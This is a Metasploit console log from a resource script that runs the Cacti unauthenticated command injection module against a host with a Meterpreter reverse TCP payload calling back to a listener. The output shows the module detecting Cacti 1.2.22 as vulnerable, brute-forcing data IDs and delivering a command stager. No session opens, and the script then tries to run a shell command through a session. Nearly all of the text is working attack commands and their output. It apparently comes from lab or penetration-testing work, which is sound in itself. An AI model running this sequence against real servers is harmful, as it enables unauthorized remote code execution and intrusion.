[*] Processing exploit_cacti_resource.rc for ERB directives.
resource (exploit_cacti_resource.rc)> use exploit/linux/http/cacti_unauthenticated_cmd_injection
[*] Using configured payload linux/x86/meterpreter/reverse_tcp
resource (exploit_cacti_resource.rc)> set RHOSTS 10.33.102.225
RHOSTS => 10.33.102.225
resource (exploit_cacti_resource.rc)> set RPORT 80
RPORT => 80
resource (exploit_cacti_resource.rc)> set LHOST 10.0.2.15
LHOST => 10.0.2.15
resource (exploit_cacti_resource.rc)> exploit -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
resource (exploit_cacti_resource.rc)> sleep 20
[*] Started reverse TCP handler on 10.0.2.15:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. The target is Cacti version 1.2.22
[*] Trying to bruteforce an exploitable host_id and local_data_id by trying up to 500 combinations
[*] Enumerating local_data_id values for host_id 1
[+] Found exploitable local_data_id 15 for host_id 1
[*] Command Stager progress - 100.00% done (1118/1118 bytes)
resource (exploit_cacti_resource.rc)> sessions -i

Active sessions
===============

No active sessions.

resource (exploit_cacti_resource.rc)> sessions -c 'ls -la' -i 1
[-] Invalid session identifier: 1
resource (exploit_cacti_resource.rc)> sleep 10
resource (exploit_cacti_resource.rc)> exit
resource (exploit_cacti_resource.rc)> exit -y
